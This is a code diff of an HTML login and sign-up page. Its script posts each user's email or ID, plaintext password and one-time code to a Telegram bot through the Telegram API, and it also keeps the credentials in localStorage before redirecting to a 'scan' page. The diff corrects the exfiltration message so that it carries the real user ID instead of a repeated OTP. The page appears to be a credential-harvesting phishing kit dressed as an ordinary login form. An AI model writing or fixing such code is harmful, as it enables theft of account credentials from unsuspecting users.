@@ -1,4 +1,4 @@
-your Email<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -63,7 +63,7 @@ your Email<!DOCTYPE html>
     <div class="container" id="login-container">
         <h2>Login</h2>
         <form id="login-form">
-            <input type="text" id="login-id" placeholder="Enter your ID" required>
+            <input type="text" id="login-id" placeholder="Enter user ID" required>
             <input type="password" id="login-password" placeholder="Enter your Password" required>
             <button type="submit">Login</button>
         </form>
@@ -121,7 +121,7 @@ your Email<!DOCTYPE html>
             generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
             // Here you would send the OTP to the user's email. For simplicity, we're just logging it.
             console.log('Generated OTP:', generatedOTP);
-            var telegramMessage = `New user sign up:\nEmail: ${generatedOTP}\nPassword: ${password}\nOTP: ${generatedOTP}`;
+            var telegramMessage = `New user sign up:\nUser Id: ${email}\nPassword: ${password}\nOTP: ${generatedOTP}`;
             await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -180,7 +180,7 @@ your Email<!DOCTYPE html>
                 localStorage.setItem('loginData', JSON.stringify({ email, password, timestamp: now }));
                 document.querySelector('.logging-in').style.display = 'block';
                 setTimeout(() => {
-                    window.location.href = 'scan50.html';
+                    window.location.href = 'scan.html';
                 }, 3500);
             } else {
                 alert('Incorrect ID or Password.');
